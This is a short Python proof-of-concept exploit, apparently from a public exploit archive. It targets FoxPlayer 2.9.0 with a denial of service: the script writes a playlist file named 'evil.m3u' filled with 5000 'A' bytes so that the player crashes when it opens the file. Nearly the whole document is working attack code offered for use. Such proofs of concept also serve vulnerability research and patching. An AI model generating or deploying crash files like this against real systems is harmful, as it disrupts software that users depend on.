#!/usr/bin/python 
# Exploit Title:Denial of Service in FoxPlayer version 2.9.0
# Download link :http://www.foxmediatools.com/installers/fox-player-setup.exe
# Author: metacom
# version: version 2.9.0
# Category: poc
# Tested on: windows 7 German  
 
filename="evil.m3u"
 
buffer = "\x41" * 5000

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()